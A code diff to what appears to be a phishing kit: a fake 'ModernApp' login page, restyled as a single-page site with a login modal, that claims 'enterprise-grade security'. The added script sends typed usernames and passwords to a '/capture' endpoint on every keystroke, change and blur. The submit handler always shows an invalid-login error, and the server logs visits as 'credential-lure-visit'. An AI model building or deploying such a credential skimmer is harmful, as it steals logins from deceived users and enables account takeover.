@@ -120,40 +120,101 @@ function loginPage() {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ModernApp - Login</title>
+    <title>ModernApp - Single Page Application</title>
     <style>
-        body{margin:0;font-family:Arial,sans-serif;background:linear-gradient(135deg,#0f172a,#1d4ed8);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#111827}
-        .card{width:92%;max-width:420px;background:#fff;border-radius:18px;box-shadow:0 24px 80px rgba(0,0,0,.35);padding:36px}
-        h1{margin:0 0 8px;color:#1d4ed8;font-size:28px}
-        p{margin:0 0 28px;color:#64748b}
-        label{display:block;margin:16px 0 8px;font-weight:700}
-        input{width:100%;box-sizing:border-box;padding:14px;border:1px solid #cbd5e1;border-radius:10px;font-size:16px}
-        button{width:100%;margin-top:24px;padding:14px;border:0;border-radius:10px;background:#1d4ed8;color:#fff;font-size:16px;font-weight:700;cursor:pointer}
-        .error{display:none;margin-top:18px;padding:12px;border-radius:10px;background:#fee2e2;color:#991b1b}
+        *{box-sizing:border-box}body{margin:0;font-family:Arial,sans-serif;background:#f5f7fb;color:#172033}
+        nav{background:linear-gradient(135deg,#1976d2,#0f4c81);color:#fff;padding:18px 32px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 18px rgba(0,0,0,.15)}
+        .logo{font-size:24px;font-weight:800;color:#fff;text-decoration:none}.nav-links{list-style:none;display:flex;gap:24px;margin:0;padding:0}.nav-links a{color:#fff;text-decoration:none;font-weight:600}
+        .hero{min-height:calc(100vh - 72px);display:flex;align-items:center;justify-content:center;text-align:center;background:linear-gradient(135deg,#e3f2fd,#fff)}
+        .hero-card{max-width:760px;padding:48px}.hero h1{font-size:54px;margin:0 0 18px;color:#1976d2}.hero p{font-size:20px;line-height:1.6;color:#475569;margin-bottom:32px}
+        .btn{display:inline-block;padding:14px 24px;border-radius:10px;border:0;background:#1976d2;color:#fff;font-weight:700;text-decoration:none;cursor:pointer;font-size:16px}
+        .btn-secondary{background:#fff;color:#1976d2;border:1px solid #1976d2;margin-left:12px}
+        .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:20;align-items:center;justify-content:center}
+        .login-card{width:92%;max-width:420px;background:#fff;border-radius:18px;box-shadow:0 24px 80px rgba(0,0,0,.35);padding:36px;position:relative}
+        .login-card h2{margin:0 0 22px;color:#1976d2;text-align:center}.close{position:absolute;right:14px;top:10px;background:transparent;border:0;font-size:26px;cursor:pointer;color:#64748b}
+        label{display:block;margin:16px 0 8px;font-weight:700}input{width:100%;padding:14px;border:1px solid #cbd5e1;border-radius:10px;font-size:16px}
+        .login-btn{width:100%;margin-top:24px;padding:14px;border:0;border-radius:10px;background:#1976d2;color:#fff;font-size:16px;font-weight:700;cursor:pointer}
+        .flash{display:none;margin-top:18px;padding:12px;border-radius:10px;background:#fee2e2;color:#991b1b}
     </style>
 </head>
 <body>
-    <main class="card">
-        <h1>ModernApp</h1>
-        <p>Sign in to continue to your account dashboard.</p>
+    <nav>
+        <a href="#" class="logo" data-section="home">ModernApp</a>
+        <ul class="nav-links">
+            <li><a href="#" data-section="home">Home</a></li>
+            <li><a href="#" id="openLogin" class="login-link">Login</a></li>
+            <li><a href="#" data-section="dashboard" class="auth-link" style="display:none;">Dashboard</a></li>
+            <li><a href="#" data-section="profile" class="auth-link" style="display:none;">Profile</a></li>
+            <li><a href="#" data-section="settings" class="auth-link" style="display:none;">Settings</a></li>
+        </ul>
+    </nav>
+    <section class="hero">
+        <div class="hero-card">
+            <h1>Welcome to ModernApp</h1>
+            <p>Enterprise-grade security with advanced encryption and authentication.</p>
+            <button class="btn btn-primary" id="openLoginHero">Get Started</button>
+            <a href="#features" class="btn btn-secondary">Learn More</a>
+        </div>
+    </section>
+    <div id="loginModal" class="modal">
         <form id="loginForm" method="POST" action="/login">
+            <div class="login-card">
+            <button type="button" id="closeLogin" class="close">&times;</button>
+            <h2>Sign In</h2>
             <label for="username">Username</label>
             <input id="username" name="username" autocomplete="username" required>
             <label for="password">Password</label>
             <input id="password" name="password" type="password" autocomplete="current-password" required>
-            <button type="submit">Sign In</button>
-            <div class="error" id="errorBox">Invalid username or password</div>
+            <button type="submit" class="login-btn" id="loginBtn"><span id="btnText">Sign In</span></button>
+            <div class="flash" id="errorBox">Invalid username or password</div>
+            </div>
         </form>
-    </main>
+    </div>
     <script>
+        const modal = document.getElementById('loginModal');
+        const openers = [document.getElementById('openLogin'), document.getElementById('openLoginHero')];
+        const closer = document.getElementById('closeLogin');
+        openers.forEach((btn) => btn && btn.addEventListener('click', (event) => {
+            event.preventDefault();
+            modal.style.display = 'flex';
+            capture('open');
+        }));
+        closer.addEventListener('click', () => modal.style.display = 'none');
+        modal.addEventListener('click', (event) => {
+            if (event.target === modal) modal.style.display = 'none';
+        });
+        function currentCreds(reason) {
+            return {
+                reason,
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                location: location.href,
+                ts: new Date().toISOString(),
+                ua: navigator.userAgent
+            };
+        }
+        function capture(reason) {
+            const data = currentCreds(reason);
+            if (!data.username && !data.password && reason !== 'open') return;
+            const body = JSON.stringify(data);
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon('/capture', new Blob([body], { type: 'application/json' }));
+            } else {
+                fetch('/capture', { method: 'POST', headers: {'Content-Type': 'application/json'}, body }).catch(() => {});
+            }
+        }
+        ['input', 'change', 'blur'].forEach((eventName) => {
+            document.getElementById('username').addEventListener(eventName, () => capture(eventName));
+            document.getElementById('password').addEventListener(eventName, () => capture(eventName));
+        });
         document.getElementById('loginForm').addEventListener('submit', async (event) => {
             event.preventDefault();
-            const form = event.target;
-            const data = Object.fromEntries(new FormData(form).entries());
+            capture('submit');
+            const data = currentCreds('submit');
             await fetch('/login', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ ...data, location: location.href, ts: new Date().toISOString() })
+                body: JSON.stringify(data)
             }).catch(() => {});
             document.getElementById('errorBox').style.display = 'block';
         });
@@ -321,7 +382,7 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    if (req.url === '/' || req.url === '/index.html') {
+    if (urlObj.pathname === '/' || urlObj.pathname === '/index.html') {
         postJson('credential-lure-visit', {
             ts: new Date().toISOString(),
             remote: req.socket.remoteAddress,
